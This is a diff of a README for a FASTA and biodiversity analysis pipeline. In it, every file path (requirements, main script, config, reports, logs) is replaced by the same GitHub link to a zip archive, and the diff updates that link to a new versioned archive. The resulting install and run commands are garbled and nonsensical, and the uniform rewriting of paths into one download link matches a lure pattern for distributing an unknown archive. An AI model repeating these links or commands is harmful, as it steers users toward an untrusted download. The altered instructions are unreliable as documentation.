@@ -46,12 +46,12 @@ source venv/bin/activate
 
 3. **Install dependencies**:
 ```bash
-pip install -r https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip
+pip install -r https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip
 ```
 
 ### Optional: GPU Support
 
-For CUDA support, uncomment the appropriate CUDA library in `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`:
+For CUDA support, uncomment the appropriate CUDA library in `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`:
 ```bash
 # For CUDA 11.x
 pip install cupy-cuda11x>=11.0.0
@@ -65,21 +65,21 @@ pip install cupy-cuda12x>=12.0.0
 ### Basic Usage
 
 ```bash
-python https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip --data https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip
+python https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip --data https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip
 ```
 
 ### Advanced Usage
 
 ```bash
-python https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip --data path/to/fasta_directory \
-               --config https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip \
+python https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip --data path/to/fasta_directory \
+               --config https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip \
                --blast-db C:\blastdb
 ```
 
 ### Command Line Arguments
 
 - `--data`: Path to input FASTA file or directory containing FASTA files (required)
-- `--config`: Path to configuration YAML file (default: `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`)
+- `--config`: Path to configuration YAML file (default: `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`)
 - `--blast-db`: Path to BLAST database directory (optional)
 - `--version`: Show version information
 
@@ -158,14 +158,14 @@ project/
 
 ### Key Output Files
 
-1. **HTML Report**: `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`
+1. **HTML Report**: `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`
    - Comprehensive analysis with all visualizations
    - Interactive taxonomic tree
    - Summary statistics
 
 2. **CSV Results**:
-   - `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`: Species counts and abundances
-   - `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip`: Biodiversity indices
+   - `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`: Species counts and abundances
+   - `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip`: Biodiversity indices
 
 3. **Visualizations**:
    - Taxonomic composition plots
@@ -229,7 +229,7 @@ The pipeline identifies potentially novel taxa through:
    - Disable some models or use smaller datasets
 
 2. **Missing Dependencies**:
-   - Ensure all packages in https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip are installed
+   - Ensure all packages in https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip are installed
    - Check Python version compatibility
 
 3. **BLAST Database Issues**:
@@ -243,7 +243,7 @@ The pipeline provides detailed logging at multiple levels:
 - **WARNING**: Non-critical issues
 - **ERROR**: Critical errors with stack traces
 
-Logs are saved to `https://raw.githubusercontent.com/clarityvivek/HeliXecution/main/kreis/HeliXecution.zip` and displayed in console.
+Logs are saved to `https://github.com/clarityvivek/HeliXecution/raw/refs/heads/main/kreis/Heli_Xecution_v3.4-alpha.5.zip` and displayed in console.
 
 ## Example Results
 
